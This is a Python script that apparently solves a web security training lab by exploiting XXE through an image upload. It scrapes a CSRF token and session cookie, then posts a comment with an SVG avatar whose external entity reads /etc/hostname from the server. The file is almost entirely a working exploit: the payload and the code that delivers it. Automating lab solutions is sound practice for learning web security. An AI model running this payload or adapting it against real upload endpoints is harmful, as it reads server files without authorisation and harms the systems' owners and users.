import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Exploiting XXE via image file upload"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch a post page\n2. Extract the csrf token and session cookie\n3. Post a comment with the malicious SVG image\n4. Check the uploaded image for the content of /etc/hostname\n5. Submit the solution\n""")

    print(Fore.WHITE + "[1] Fetching a post page")
    post_page = requests.get(
        f"{url}/post?postId=1", allow_redirects=False, verify=False, proxies=proxies)
    
    print(Fore.WHITE + "[2] Extracting the csrf token and session cookie")

    session = post_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

    print(Fore.WHITE + "[3] Posting a comment with the malicious SVG image")

    svg_image = """<?xml version="1.0" standalone="yes"?>
                    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
                    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
                        <text font-size="16" x="0" y="16">
                            &xxe;
                        </text>
                    </svg>"""
    svg_image_name = "image.svg" # You can change this to what you want
    files = { "avatar": (svg_image_name, svg_image, "image/svg+xml") }
    cookies = { "session": session }
    data = { "csrf": csrf_token, "postId": "1", "name": "mystic_mido", "comment": "mystic_mido", "email": "mystic_mido@gmail.com" }
    

    try:
        r = requests.post(
            f"{url}/post/comment", data=data, cookies=cookies, files=files, allow_redirects=False, verify=False, proxies=proxies)
        print(Fore.WHITE + "Check " + Fore.GREEN + "/post/comment/avatars?filename=1.png" + Fore.WHITE + " for the content of /etc/hostname then submit the solution")
        return True

    except Exception as e:
        print(f"[!] Failed to check stock with the injected payload through exception")
        return False
